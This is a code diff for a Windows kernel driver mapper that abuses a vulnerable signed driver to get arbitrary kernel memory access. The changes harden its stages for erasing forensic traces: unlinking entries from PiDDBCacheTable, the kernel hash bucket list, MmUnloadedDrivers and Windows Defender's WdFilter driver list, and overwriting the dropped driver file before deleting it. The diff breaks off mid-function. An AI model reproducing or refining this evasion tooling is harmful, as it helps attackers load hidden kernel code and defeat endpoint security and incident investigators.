@@ -57,9 +57,105 @@ static bool g_driverWasLoadedByUs = false;
 //that modify existing kernel state.
 bool Driver::g_skipForensicCleanup = false;
 
+/*
+ * Statuses Load returns for each forensic stage.
+ *
+ * These used to be written as "STATUS_DELETE_PENDING | 0x1000" and friends at
+ * each call site, which is three problems at once: the intent is only in the
+ * literal, the same base code is repeated four times, and nothing records that
+ * the OR-ed value is an application-defined status rather than a documented one.
+ *
+ * They are application-defined and deliberately so. Microsoft reserves
+ * 0xC0000000-0xC0000FFF for system statuses, so a status in the 0xC000_1000
+ * range can be recognised as "this is the mapper telling you which stage
+ * failed" and cannot collide with a system code the OS might return instead.
+ * Only NT_SUCCESS() is ever tested against them - the caller either aborts or
+ * does not - so the exact value is a diagnostic, not a contract.
+ */
+#define AMEGER_STAGE_STATUS(n) (static_cast<NTSTATUS>(0xC0001000u + (n)))
+
 //Random name for the dropped provider and its service, generated once per run
 //so the same name is used consistently for load, match and cleanup.
 static std::string cachedDriverName = "";
+
+/*
+ * Kernel address probing.
+ *
+ * The provider memcpy's whatever address it is handed and does not validate it,
+ * so a read or write to an unmapped kernel address faults inside the provider:
+ * bugcheck 0x50, not a clean false. Range-checking a pointer is necessary but not
+ * sufficient here - everything at or above 0xFFFF000000000000 passes it, and the
+ * great majority of it is not mapped.
+ *
+ * MmIsAddressValid runs in the kernel and never faults, so calling it through the
+ * provider converts "this address is not mapped" from a bugcheck into a refusal.
+ * It is called before every dereference of a pointer this file did not resolve
+ * itself.
+ *
+ * These live at the top of the file rather than beside the WdFilter walk that
+ * introduced them, because they are not WdFilter-specific: the hash bucket walk
+ * and the PiDDB unlink dereference kernel pointers of the same kind, and a probe
+ * that only one caller could reach is a probe the next caller will not use.
+ */
+
+//True when value lies in the kernel half of the address space. A structure
+//field that is supposed to hold a kernel pointer but does not mean the layout
+//does not match this build; dereferencing it through the provider would fault
+//inside the provider (a bugcheck, not a clean failure), so callers refuse
+//instead of following it.
+static bool IsKernelAddress(uint64_t value) {
+	return value >= 0xFFFF000000000000ULL;
+}
+
+//Safe probe before handing an address to the provider. Returns false for a
+//non-kernel address without calling into the kernel at all.
+static bool ProbeKernelAddressMapped(uint64_t address) {
+	if (!IsKernelAddress(address))
+		return false;
+
+	static uint64_t kernel_MmIsAddressValid = 0;
+	//Retry-on-zero, not a one-shot "attempted" flag: a first call made before
+	//ntoskrnlAddr was resolved used to cache the failure permanently and every
+	//later probe silently fell back to the range check alone.
+	if (!kernel_MmIsAddressValid) {
+		kernel_MmIsAddressValid = Driver::GetKernelModuleExport(Driver::ntoskrnlAddr, "MmIsAddressValid");
+	}
+	//No probe available: fall back to the range check alone. The caller still has
+	//its iteration cap and kernel-range checks, so this is strictly better than
+	//the unchecked read it replaced.
+	if (!kernel_MmIsAddressValid)
+		return true;
+
+	BOOLEAN valid = FALSE;
+	if (!Driver::CallKernelFunction(&valid, kernel_MmIsAddressValid, (PVOID)address))
+		return false;
+	return valid != FALSE;
+}
+
+//Probe a span rather than a single address. Used where a loop is about to read a
+//whole array: probing each element costs one kernel round trip per slot, and the
+//arrays involved are each a single allocation, so the two ends imply the middle.
+static bool ProbeKernelRangeMapped(uint64_t address, uint64_t size) {
+	//Bounded so a file controlled length cannot become an "ends of a 4 GB range"
+	//argument that is meaningless as a proof. The largest caller below is a
+	//32768 entry array.
+	if (size == 0 || size > 0x10000)
+		return false;
+	if (!IsKernelAddress(address))
+		return false;
+
+	const uint64_t last = address + size - 1;
+	if (last < address)
+		return false;
+	if (!IsKernelAddress(last))
+		return false;
+
+	if (!ProbeKernelAddressMapped(address))
+		return false;
+	if (!ProbeKernelAddressMapped(last))
+		return false;
+	return true;
+}
 
 /*
  * The process-wide PRNG, seeded once from std::random_device.
@@ -141,13 +237,12 @@ bool Driver::IsRunning() {
 //Required to open kernel handles and to read kernel memory through them.
 NTSTATUS Driver::AcquireDebugPrivilege() {
 
-	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-	if (ntdll == NULL) {
-		return STATUS_UNSUCCESSFUL;
-	}
-
 	ULONG SE_DEBUG_PRIVILEGE = 20UL;
-	BOOLEAN SeDebugWasEnabled;
+	BOOLEAN SeDebugWasEnabled = FALSE;
+	//RtlAdjustPrivilege is a direct import from ntdll, so there is nothing to
+	//look up first. This used to be preceded by a GetModuleHandleA("ntdll.dll")
+	//whose result was discarded by the calls below, which read as though the
+	//lookup mattered; it cannot fail for a process that is running.
 	NTSTATUS Status = Nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
 	if (!NT_SUCCESS(Status)) {
 		Log("[-] Failed to acquire SE_DEBUG_PRIVILEGE" << std::endl);
@@ -171,6 +266,30 @@ NTSTATUS Driver::AcquireDebugPrivilege() {
 NTSTATUS Driver::Load() {
 	Log(L"[!] Using vulnerable driver provider: " << Val(Provider::kShortName) << L", Device: " << Val(Provider::kDeviceName) << std::endl);
 
+	/*
+	 * SeDebugPrivilege, acquired before either branch below.
+	 *
+	 * This was inside the "provider is not running" branch, because that branch
+	 * needs it to register a service. That comment was wrong, and the code was
+	 * wrong with it: SystemModuleInformation returns an ImageBase of 0 for every
+	 * single module to a process that does not hold SeDebugPrivilege. Verified on
+	 * a run of this machine - 289 modules, 289 with an ImageBase of zero, and the
+	 * same query after RtlAdjustPrivilege returning 289 populated ones and
+	 * ntoskrnl.exe at a real address.
+	 *
+	 * So the moment a provider was already loaded - vendor software, or simply a
+	 * second run after the first could not unload it - Load skipped the privilege,
+	 * found no kernel modules at all, and aborted at
+	 * "[-] Failed to get ntoskrnl.exe". The reuse path described below could
+	 * never work: it failed before reaching any of the work it exists to do.
+	 */
+	const auto debug_privilege = AcquireDebugPrivilege();
+	if (!NT_SUCCESS(debug_privilege)) {
+		Log(L"[-] Failed to acquire SeDebugPrivilege" << std::endl);
+		Driver::Unload();
+		return debug_privilege;
+	}
+
 	//If the provider driver is already running on the system (vendor software
 	//loaded it) we just reuse the existing device. No service registration,
 	//no file drop, nothing to clean up afterwards.
@@ -193,16 +312,9 @@ NTSTATUS Driver::Load() {
 			return STATUS_DISK_OPERATION_FAILED;
 		}
 
-		auto status = AcquireDebugPrivilege();
-		if (!NT_SUCCESS(status)) {
-			Log(L"[-] Failed to acquire SeDebugPrivilege" << std::endl);
-			_wremove(driver_path.c_str());
-			return status;
-		}
-
 		//Separates the provider setup from the load result that follows.
 		LogBlank();
-		status = Service::RegisterAndStart(driver_path, GetDriverNameW());
+		auto status = Service::RegisterAndStart(driver_path, GetDriverNameW());
 		if (!NT_SUCCESS(status)) {
 			Log(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
 			_wremove(driver_path.c_str());
@@ -271,9 +383,11 @@ NTSTATUS Driver::Load() {
 	//name every run, but the kernel entry we need to clear holds the name the
 	//previous run or the vendor registered — a string this run's name can never
 	//match. Every cleanup stage below looks for entries by name, so in reuse
-	//mode they would all miss and fatal-abort. SeDebugPrivilege was also not
-	//acquired: it is only needed to register the service, which reuse skips.
-	//There is nothing of this run to clean, so the walks are skipped entirely.
+	//mode they would all miss and fatal-abort. There is nothing of this run to
+	//clean, so the walks are skipped entirely.
+	//
+	//(The old version of this comment also claimed SeDebugPrivilege was
+	//unnecessary in reuse mode. It was wrong - see the call at the top of Load.)
 	LogBlank();
 	if (!g_driverWasLoadedByUs) {
 		Log(L"[*] Provider reused from a prior load, forensic cleanup skipped (provider name differs from this run)" << std::endl);
@@ -289,7 +403,7 @@ NTSTATUS Driver::Load() {
 	if (!Driver::ClearPiDDBCacheTable()) {
 		Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
 		Driver::Unload();
-		return STATUS_DELETE_PENDING | 0x1000; //add custom value to error code to identify specific fail
+		return AMEGER_STAGE_STATUS(1);
 	}
 	LogBlank();
 
@@ -297,7 +411,7 @@ NTSTATUS Driver::Load() {
 	if (!Driver::ClearKernelHashBucketList()) {
 		Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
 		Driver::Unload();
-		return STATUS_DELETE_PENDING | 0x2000;
+		return AMEGER_STAGE_STATUS(2);
 	}
 	LogBlank();
 
@@ -306,7 +420,7 @@ NTSTATUS Driver::Load() {
 	if (!Driver::ClearMmUnloadedDrivers()) {
 		Log(L"[-] Failed to ClearMmUnloadedDrivers" << std::endl);
 		Driver::Unload();
-		return STATUS_DELETE_PENDING | 0x3000;
+		return AMEGER_STAGE_STATUS(3);
 	}
 	LogBlank();
 
@@ -315,7 +429,7 @@ NTSTATUS Driver::Load() {
 	if (!Driver::ClearWdFilterDriverList()) {
 		Log("[-] Failed to ClearWdFilterDriverList" << std::endl);
 		Driver::Unload();
-		return STATUS_DELETE_PENDING | 0x4000;
+		return AMEGER_STAGE_STATUS(4);
 	}
 
 	return STATUS_SUCCESS;
@@ -357,15 +471,28 @@ static uint32_t VerifyWdFilterListHead(uint64_t block_base, uint32_t candidate_o
 	//Both links of a list head are kernel pointers. An uninitialised field, or
 	//one that lands on something other than a list, yields zero here.
 	const uint64_t self = block_base + candidate_offset;
-	if (reinterpret_cast<uint64_t>(head.Flink) < 0xFFFF000000000000ULL ||
-		reinterpret_cast<uint64_t>(head.Blink) < 0xFFFF000000000000ULL)
+	if (!IsKernelAddress(reinterpret_cast<uint64_t>(head.Flink)) ||
+		!IsKernelAddress(reinterpret_cast<uint64_t>(head.Blink)))
 		return 0;
 
 	//Empty list: both links point at the head itself.
 	if (head.Flink == head.Blink && reinterpret_cast<uint64_t>(head.Flink) == self)
 		return candidate_offset;
 
-	//Non empty list: the first and last entries must point back at the head.
+	/*
+	 * Non empty list: the first and last entries must point back at the head.
+	 *
+	 * These two reads are the first ones this walk makes at an address it has
+	 * not resolved, and they are reached for every pointer aligned candidate
+	 * offset in the block - so they are the reads most likely to be handed an
+	 * unmapped address by a candidate that merely looked plausible. The kernel
+	 * range test admits every unmapped kernel address and the provider does not
+	 * validate, so the pair is probed before it is read rather than after.
+	 */
+	if (!ProbeKernelRangeMapped(reinterpret_cast<uint64_t>(head.Flink), sizeof(LIST_ENTRY)) ||
+		!ProbeKernelRangeMapped(reinterpret_cast<uint64_t>(head.Blink), sizeof(LIST_ENTRY)))
+		return 0;
+
 	LIST_ENTRY first = { 0, 0 };
 	LIST_ENTRY last = { 0, 0 };
 	if (!Driver::ReadMemory(reinterpret_cast<uint64_t>(head.Flink), &first, sizeof(first)) ||
@@ -404,17 +531,31 @@ static bool WdFilterCountAndArrayAgree(uint64_t block_base, uint32_t count_offse
 	if (count == 0 || count > kMaxWdFilterRuntimeDrivers)
 		return false;
 
-	if (array < 0xFFFF000000000000ULL)
+	if (!IsKernelAddress(array))
 		return false;
 
 	const ULONG to_check = count < 64 ? count : 64;
+
+	/*
+	 * The whole window that is about to be read, probed once before any of it is
+	 * touched.
+	 *
+	 * This loop runs for every (count_offset, array_offset) candidate pair in the
+	 * block, and `array` is a value read out of that block - so a pair that
+	 * merely looked plausible turned up to 64 reads at whatever it happened to
+	 * point at. The end-point probe covers the span, because the array is a
+	 * single contiguous allocation.
+	 */
+	if (!ProbeKernelRangeMapped(array, static_cast<uint64_t>(to_check) * sizeof(uint64_t)))
+		return false;
+
 	for (ULONG i = 0; i < to_check; ++i) {
 		uint64_t entry = 0;
 		if (!Driver::ReadMemory(array + static_cast<uint64_t>(i) * sizeof(uint64_t), &entry, sizeof(entry)))
 			return false;
 
 		//Zero is what an unused slot holds; anything else must be a pointer.
-		if (entry != 0 && entry < 0xFFFF000000000000ULL)
+		if (entry != 0 && !IsKernelAddress(entry))
 			return false;
 	}
 
@@ -495,7 +636,6 @@ static bool FindWdFilterRuntimeDriverBlock(uint64_t block_base,
  * which is ci.dll's HashBucketEntry.DriverName, not a WdFilter offset).
  */
 
-static constexpr uint64_t kWdFilterKernelBase = 0xFFFF000000000000ULL;
 static constexpr USHORT kWdFilterDriverInfoMagic = 0xDA18;
 
 //Window around a list entry inside which the entry's own UNICODE_STRING and
@@ -507,54 +647,9 @@ static constexpr int32_t kWdFilterEntryScanRadius = 0x80;
 //before Entry.
 static constexpr uint64_t kWdFilterMaxBaseDelta = 0x80;
 
-static bool WdFilterIsKernel(uint64_t value) {
-	return value >= kWdFilterKernelBase;
-}
-
-//Safe probe before handing an address to the provider. The provider memcpy's
-//without validating, so reading an unmapped kernel address faults inside the
-//provider (bugcheck 0x50), not a clean false. MmIsAddressValid runs in the
-//kernel and never faults, so it converts that bugcheck into a refusal.
-static bool WdFilterProbeMapped(uint64_t address) {
-	if (!WdFilterIsKernel(address))
-		return false;
-	static uint64_t kernel_MmIsAddressValid = 0;
-	//Retry-on-zero, not a one-shot "attempted" flag: a first call made before
-	//ntoskrnlAddr was resolved used to cache the failure permanently and every
-	//later probe silently fell back to the range check alone.
-	if (!kernel_MmIsAddressValid) {
-		kernel_MmIsAddressValid = Driver::GetKernelModuleExport(Driver::ntoskrnlAddr, "MmIsAddressValid");
-	}
-	//No probe available: fall back to the range check alone. The walk still
-	//has its iteration cap and kernel-range checks, so this is strictly better
-	//than the old unchecked read.
-	if (!kernel_MmIsAddressValid)
-		return true;
-	BOOLEAN valid = FALSE;
-	if (!Driver::CallKernelFunction(&valid, kernel_MmIsAddressValid, (PVOID)address))
-		return false;
-	return valid != FALSE;
-}
-
-static bool WdFilterRangeMapped(uint64_t address, uint64_t size) {
-	if (size == 0 || size > 0x10000)
-		return false;
-	if (!WdFilterIsKernel(address))
-		return false;
-	const uint64_t last = address + size - 1;
-	if (last < address)
-		return false;
-	if (!WdFilterIsKernel(last))
-		return false;
-	//Contiguous pool/image allocations only need their ends probed; anything
-	//unmapped in between would still fault, but the array and the entry
-	//neighbourhood are each a single allocation, so ends imply backing.
-	if (!WdFilterProbeMapped(address))
-		return false;
-	if (!WdFilterProbeMapped(last))
-		return false;
-	return true;
-}
+//The range checks and the MmIsAddressValid probe are not WdFilter-specific and
+//live at the top of this file as IsKernelAddress / ProbeKernelAddressMapped /
+//ProbeKernelRangeMapped. See the comment there for why they are shared.
 
 //Filename-boundary suffix match, case insensitive. The stored name is the full
 //path the kernel hashed, so equality never holds and a plain substring lets
@@ -596,7 +691,7 @@ static bool WdFilterFindNameInEntry(uintptr_t entry, const std::wstring& driver_
 			if (field_addr < entry)
 				continue;
 		}
-		if (!WdFilterRangeMapped(field_addr, sizeof(UNICODE_STRING)))
+		if (!ProbeKernelRangeMapped(field_addr, sizeof(UNICODE_STRING)))
 			continue;
 		UNICODE_STRING cand = { 0 };
 		if (!Driver::ReadMemory(field_addr, &cand, sizeof(cand)))
@@ -605,9 +700,9 @@ static bool WdFilterFindNameInEntry(uintptr_t entry, const std::wstring& driver_
 			(cand.Length % sizeof(wchar_t)) != 0 ||
 			cand.MaximumLength < cand.Length)
 			continue;
-		if (!WdFilterIsKernel(reinterpret_cast<uint64_t>(cand.Buffer)))
+		if (!IsKernelAddress(reinterpret_cast<uint64_t>(cand.Buffer)))
 			continue;
-		if (!WdFilterRangeMapped(reinterpret_cast<uint64_t>(cand.Buffer), cand.Length))
+		if (!ProbeKernelRangeMapped(reinterpret_cast<uint64_t>(cand.Buffer), cand.Length))
 			continue;
 		auto buf = std::make_unique<wchar_t[]>(static_cast<size_t>(cand.Length) / sizeof(wchar_t) + 1);
 		if (!Driver::ReadMemory(reinterpret_cast<uint64_t>(cand.Buffer), buf.get(), cand.Length))
@@ -639,7 +734,7 @@ static bool WdFilterFindDriverInfo(uintptr_t entry, uintptr_t& out_info) {
 		if (entry < back)
 			continue;
 		const uint64_t addr = entry - back;
-		if (!WdFilterRangeMapped(addr, sizeof(USHORT)))
+		if (!ProbeKernelRangeMapped(addr, sizeof(USHORT)))
 			continue;
 		USHORT magic = 0;
 		if (!Driver::ReadMemory(addr, &magic, sizeof(magic)))
@@ -796,9 +891,9 @@ bool Driver::ClearWdFilterDriverList() {
 		const uint64_t array_end = list_array + total_array_bytes;
 		if (total_array_bytes > static_cast<uint64_t>(kMaxWdFilterRuntimeDrivers) * sizeof(uint64_t) ||
 			array_end < list_array ||
-			!WdFilterIsKernel(array_end - 1) ||
-			!WdFilterRangeMapped(list_array, sizeof(uint64_t)) ||
-			!WdFilterRangeMapped(array_end - sizeof(uint64_t), sizeof(uint64_t))) {
+			!IsKernelAddress(array_end - 1) ||
+			!ProbeKernelRangeMapped(list_array, sizeof(uint64_t)) ||
+			!ProbeKernelRangeMapped(array_end - sizeof(uint64_t), sizeof(uint64_t))) {
 			Log(L"[INFO] WdFilter runtime driver array backing is not fully mapped, clear skipped" << std::endl);
 			return true;
 		}
@@ -819,14 +914,14 @@ bool Driver::ClearWdFilterDriverList() {
 			Log(L"[INFO] WdFilter runtime driver list walk exceeded its reported count, clear skipped" << std::endl);
 			return true;
 		}
-		if (!Entry || !WdFilterIsKernel(reinterpret_cast<uint64_t>(Entry)))
+		if (!Entry || !IsKernelAddress(reinterpret_cast<uint64_t>(Entry)))
 		{
 			//A null or non-kernel entry means the list does not match this build.
 			//Nothing has been written, so skip rather than failing the mapping.
 			Log("[INFO] WdFilter runtime driver list entry is not a kernel pointer, clear skipped" << std::endl);
 			return true;
 		}
-		if (!WdFilterRangeMapped(reinterpret_cast<uint64_t>(Entry), sizeof(LIST_ENTRY))) {
+		if (!ProbeKernelRangeMapped(reinterpret_cast<uint64_t>(Entry), sizeof(LIST_ENTRY))) {
 			Log("[INFO] WdFilter runtime driver list entry is not mapped, clear skipped" << std::endl);
 			return true;
 		}
@@ -884,14 +979,14 @@ bool Driver::ClearWdFilterDriverList() {
 						return true;
 					}
 					const uint64_t v = reinterpret_cast<uint64_t>(value);
-					if (!WdFilterIsKernel(v))
+					if (!IsKernelAddress(v))
 						continue;
 					if (v > entry_addr)
 						continue;
 					const uint64_t delta = entry_addr - v;
 					if (delta > kWdFilterMaxBaseDelta)
 						continue;
-					if (!WdFilterRangeMapped(v, delta + sizeof(LIST_ENTRY)))
+					if (!ProbeKernelRangeMapped(v, delta + sizeof(LIST_ENTRY)))
 						continue;
 					//Structural ordering: info < base <= entry. A build with
 					//the info elsewhere that merely has 0xDA18 at some other
@@ -918,21 +1013,21 @@ bool Driver::ClearWdFilterDriverList() {
 				uint64_t prev_raw = 0;
 				const uint64_t entry_flink_addr = entry_addr + offsetof(LIST_ENTRY, Flink);
 				const uint64_t entry_blink_addr = entry_addr + offsetof(LIST_ENTRY, Blink);
-				if (!WdFilterRangeMapped(entry_flink_addr, sizeof(uint64_t)) ||
-					!WdFilterRangeMapped(entry_blink_addr, sizeof(uint64_t)) ||
+				if (!ProbeKernelRangeMapped(entry_flink_addr, sizeof(uint64_t)) ||
+					!ProbeKernelRangeMapped(entry_blink_addr, sizeof(uint64_t)) ||
 					!ReadMemory(entry_flink_addr, &next_raw, sizeof(next_raw)) ||
 					!ReadMemory(entry_blink_addr, &prev_raw, sizeof(prev_raw))) {
 					Log(L"[INFO] Could not read WdFilter list neighbours, clear skipped" << std::endl);
 					return true;
 				}
-				if (!WdFilterIsKernel(next_raw) || !WdFilterIsKernel(prev_raw)) {
+				if (!IsKernelAddress(next_raw) || !IsKernelAddress(prev_raw)) {
 					Log(L"[INFO] WdFilter list neighbours are not kernel pointers, clear skipped" << std::endl);
 					return true;
 				}
 				const uint64_t next_blink_addr = next_raw + offsetof(LIST_ENTRY, Blink);
 				const uint64_t prev_flink_addr = prev_raw + offsetof(LIST_ENTRY, Flink);
-				if (!WdFilterRangeMapped(next_blink_addr, sizeof(uint64_t)) ||
-					!WdFilterRangeMapped(prev_flink_addr, sizeof(uint64_t))) {
+				if (!ProbeKernelRangeMapped(next_blink_addr, sizeof(uint64_t)) ||
+					!ProbeKernelRangeMapped(prev_flink_addr, sizeof(uint64_t))) {
 					Log(L"[INFO] WdFilter neighbour link fields are not mapped, clear skipped" << std::endl);
 					return true;
 				}
@@ -1067,9 +1162,31 @@ NTSTATUS Driver::Unload() {
 	if (!g_driverWasLoadedByUs)
 		return STATUS_SUCCESS;
 
-	auto status = Service::StopAndRemove(GetDriverNameW());
-	if (!NT_SUCCESS(status))
-		return status;
+	/*
+	 * The teardown state is cleared here, up front, rather than at the end.
+	 *
+	 * It used to be left set, so a second Unload re-ran StopAndRemove against a
+	 * service key that was already gone and then reported STATUS_DELETE_PENDING
+	 * because the file was already gone. The crash handler calls Unload and the
+	 * normal path calls it too, so a crash after a successful run got an error
+	 * back from a teardown that had in fact completed. Clearing first makes the
+	 * second call a no-op on every exit path, including the early returns below.
+	 */
+	g_driverWasLoadedByUs = false;
+
+	const NTSTATUS service_status = Service::StopAndRemove(GetDriverNameW());
+	if (!NT_SUCCESS(service_status)) {
+		/*
+		 * Reported, but deliberately not returned from, and the wipe below is
+		 * attempted anyway rather than skipped.
+		 *
+		 * The previous version returned here, which skipped the overwrite and the
+		 * unlink entirely and left %TEMP%\<name> on disk holding a complete,
+		 * signed, loadable driver.
+		 */
+		Log(L"[-] Failed to stop and remove the provider service ("
+			<< Val(Hex(service_status)) << L"); continuing so the dropped file is still wiped" << std::endl);
+	}
 	LogBlank();
 
 	std::wstring driver_path = GetDriverPath();
@@ -1078,22 +1195,42 @@ NTSTATUS Driver::Unload() {
 	 * Overwrite the provider's bytes in place before unlinking it.
 	 *
 	 * The previous version opened the file with trunc, which frees the original
-	 * clusters before a single byte is written and then allocates new ones for
-	 * the longer random buffer that followed. The result is that the original
-	 * image was left intact on disk, and the clusters holding it were released
-	 * by the truncate rather than by the delete - the opposite of what the
-	 * comment above it claimed.
+	 * clusters before a single byte is written and then allocates new ones for the
+	 * longer random buffer that followed. The result was that the original image
+	 * was left intact on disk, and the clusters holding it were released by the
+	 * truncate rather than by the delete - the opposite of what the comment above
+	 * it claimed.
 	 *
 	 * Opening for read/write without truncating, and writing exactly as many
 	 * bytes as the file already holds, overwrites the clusters the image
 	 * occupies: the MFT record keeps pointing at them, and the new bytes land on
 	 * them. The delete that follows then releases clusters that no longer
 	 * contain the original content.
+	 *
+	 * This only works once the driver is unloaded, and that is not something this
+	 * function can arrange. The I/O manager holds a loaded image open sharing
+	 * read access only, so the open below fails with ERROR_SHARING_VIOLATION for
+	 * as long as the provider is resident - verified on a run where NtUnloadDriver
+	 * returned STATUS_UNLOAD_FAILED and the file survived untouched. That is not a
+	 * failure of the wipe, it is a statement that the driver is still loaded, and
+	 * it is reported as such because the two need very different responses.
 	 */
 	std::error_code size_error;
 	const auto original_size = std::filesystem::file_size(driver_path, size_error);
 
+	//Whether the bytes on disk were actually destroyed. False at the end means
+	//the image may still be recoverable from %TEMP%.
+	bool wiped = false;
+
 	if (size_error || original_size == 0) {
+		//"not there" and "there but its size is unreadable" are different
+		//outcomes. The first means the unlink below has nothing to do and must not
+		//be reported as a failure; the second means the bytes may still be on disk.
+		std::error_code exists_error;
+		if (size_error && !std::filesystem::exists(driver_path, exists_error)) {
+			Log(L"[INFO] The provider file is already gone, nothing to wipe" << std::endl);
+			return service_status;
+		}
 		Log(L"[-] Can't determine the size of the driver file, skipping the overwrite before unlink" << std::endl);
 	}
 	else if (original_size > kMaxDriverOverwriteSize) {
@@ -1104,36 +1241,88 @@ NTSTATUS Driver::Unload() {
 		//clusters that already hold the image.
 		std::fstream file_stream(driver_path.c_str(), std::ios_base::in | std::ios_base::out | std::ios_base::binary);
 		if (!file_stream.is_open()) {
-			Log(L"[-] Error opening driver file to dump random data inside the disk" << std::endl);
-			return STATUS_DELETE_PENDING;
+			const DWORD open_error = GetLastError();
+
+			if (open_error == ERROR_SHARING_VIOLATION) {
+				//The one failure here with a known cause and a known remedy.
+				Log(L"[-] Cannot overwrite the provider file: it is still held open by the loaded driver"
+					<< L" (error " << Val(static_cast<unsigned long>(open_error)) << L")" << std::endl);
+				Log(L"[-] The provider is still resident in kernel memory; its image cannot be wiped"
+					<< L" until that driver unloads." << std::endl);
+			}
+			else {
+				Log(L"[-] Error opening driver file to dump random data inside the disk"
+					<< L" (error " << Val(static_cast<unsigned long>(open_error)) << L")" << std::endl);
+			}
 		}
+		else {
+			auto random_data = std::make_unique<BYTE[]>(static_cast<size_t>(original_size));
+			//Same 0..255 byte range as the rand() version, drawn from the shared
+			//engine so the overwrite is not predictable from the name it shares a
+			//seed with.
+			auto& engine = RandomEngine();
+			std::uniform_int_distribution<int> byte_dist(0, 255);
+			for (size_t i = 0; i < static_cast<size_t>(original_size); ++i)
+				random_data[i] = static_cast<BYTE>(byte_dist(engine));
 
-		auto random_data = std::make_unique<BYTE[]>(static_cast<size_t>(original_size));
-		//Same 0..255 byte range as the rand() version, drawn from the shared
-		//engine so the overwrite is not predictable from the name it shares a
-		//seed with.
-		auto& engine = RandomEngine();
-		std::uniform_int_distribution<int> byte_dist(0, 255);
-		for (size_t i = 0; i < static_cast<size_t>(original_size); ++i)
-			random_data[i] = static_cast<BYTE>(byte_dist(engine));
+			file_stream.write(reinterpret_cast<const char*>(random_data.get()), original_size);
+			file_stream.flush();
+			file_stream.close();
 
-		file_stream.write(reinterpret_cast<const char*>(random_data.get()), original_size);
-		file_stream.flush();
-		file_stream.close();
-
-		if (!file_stream) {
-			Log(L"[-] Error dumping random data over the driver file" << std::endl);
-			return STATUS_DELETE_PENDING;
+			if (!file_stream) {
+				Log(L"[-] Error dumping random data over the driver file" << std::endl);
+			}
+			else {
+				wiped = true;
+				Log(L"[+] Vulnerable driver data destroyed before unlink." << std::endl);
+			}
 		}
-
-		Log(L"[+] Vulnerable driver data destroyed before unlink." << std::endl);
 	}
 
 	//unlink the file
-	if (_wremove(driver_path.c_str()) != 0)
-		return STATUS_DELETE_PENDING;
+	//
+	//std::filesystem::remove rather than _wremove, because _wremove cannot tell
+	//"deleted" from "was not there": a second teardown reported
+	//STATUS_DELETE_PENDING for a file it had already removed.
+	//
+	//Attempted even when the wipe failed. Removing the directory entry still takes
+	//the file away by name, and its clusters are unreachable that way even though
+	//they keep the content - so "not wiped but removed" is materially better than
+	//"not wiped and still there", and is worth the attempt.
+	std::error_code remove_error;
+	const bool removed = std::filesystem::remove(driver_path, remove_error);
 
-	return STATUS_SUCCESS;
+	if (!removed || remove_error) {
+		if (remove_error) {
+			Log(L"[-] Could not remove the provider file (error "
+				<< Val(static_cast<unsigned long>(remove_error.value())) << L")" << std::endl);
+		}
+		else {
+			Log(L"[-] Could not remove the provider file" << std::endl);
+		}
+
+		/*
+		 * Still there. If the bytes were also not destroyed, or the service
+		 * failed, something was left behind and the returned status has to say so:
+		 * it is the only way the caller can tell this run from a clean one.
+		 */
+		if (!wiped && NT_SUCCESS(service_status))
+			return STATUS_DELETE_PENDING;
+
+		return service_status;
+	}
+
+	if (!wiped) {
+		//Removed but not overwritten: the image is gone by name while its clusters
+		//still hold it. Said plainly, so the removal does not read as a completed
+		//wipe.
+		Log(L"[!] The provider file was removed without being overwritten; its clusters still hold the image until they are reused" << std::endl);
+	}
+
+	//The service result is returned last, and only matters when it was a failure:
+	//a successful wipe of a file whose driver is still resident is not a clean
+	//teardown, and the caller has to be able to say so.
+	return service_status;
 }
 
 bool Driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
@@ -1198,15 +1387,6 @@ static bool ProbePteSelfMapBase();
  * miss is a clean abort instead of a corrupted kernel structure.
  */
 
-//True when value lies in the kernel half of the address space. A structure
-//field that is supposed to hold a kernel pointer but does not means the layout
-//does not match this build; dereferencing it through the provider would fault
-//inside the provider (a bugcheck, not a clean failure), so callers refuse
-//instead of following it.
-static bool IsKernelAddress(uint64_t value) {
-	return value >= 0xFFFF000000000000ULL;
-}
-
 //Read the string a UNICODE_STRING points at, after checking that the structure
 //itself is plausible: a kernel range pointer, a non zero length that fits the
 //field and is a whole number of characters, and a MaximumLength that covers
@@ -1227,7 +1407,20 @@ static bool ReadWideStringField(const UNICODE_STRING& text, std::wstring& out) {
 	return true;
 }
 
-//Offset of a UNICODE_STRING member inside object that holds needle, 0 if absent.
+/*
+ * Returned by FindUnicodeStringFieldByContent when the field is not in the
+ * object at all.
+ *
+ * Deliberately not 0: 0 is the offset of the first member of a struct, which is
+ * where _DRIVER_EXTENSION.DriverObject really does sit, so reusing 0 as "not
+ * found" made a legitimate layout indistinguishable from a failed lookup. The
+ * same reasoning is why SymbolsHandler::kFieldUnresolved is ~0ULL and why
+ * SymbolEngine::FieldResult::Resolved() exists.
+ */
+static constexpr uint32_t kFieldNotFound = 0xFFFFFFFFu;
+
+//Offset of a UNICODE_STRING member inside object that holds needle, or
+//kFieldNotFound when no member does.
 //Scans on pointer alignment, stops at the first structure that cannot be read,
 //and only returns an offset whose content matches exactly.
 static uint32_t FindUnicodeStringFieldByContent(uint64_t object, size_t object_size, const std::wstring& needle) {
@@ -1244,7 +1437,7 @@ static uint32_t FindUnicodeStringFieldByContent(uint64_t object, size_t object_s
 			return offset;
 	}
 
-	return 0;
+	return kFieldNotFound;
 }
 
 /*
@@ -1442,10 +1635,37 @@ static bool ProbePteSelfMapBase() {
 
 	const uint64_t kUserSharedData = 0xFFFFF78000000000ULL;
 
+	/*
+ * Upper bound on a believable page frame number, used when the real figure
+ * cannot be read.
+ *
+ * 2^24 frames is 64 GB of physical memory, comfortably above any machine this
+ * runs on and far below the 2^36 a 64-bit frame number can hold - so a PTE that
+ * decodes to a frame above it is still refused as a mis-decode. This is a weaker
+ * bound than the real one, which is the point: it is a fallback, not a
+ * replacement, and it exists so that a failed Win32 call degrades the check
+ * rather than removing it.
+ */
+static constexpr uint64_t kFallbackMaxPfn = 1ULL << 24;
+
 	MEMORYSTATUSEX ms{};
 	ms.dwLength = sizeof(ms);
-	GlobalMemoryStatusEx(&ms);
-	const uint64_t max_pfn = ms.ullTotalPhys / 0x1000;
+	uint64_t max_pfn = kFallbackMaxPfn;
+	if (GlobalMemoryStatusEx(&ms)) {
+		const uint64_t reported = ms.ullTotalPhys / 0x1000;
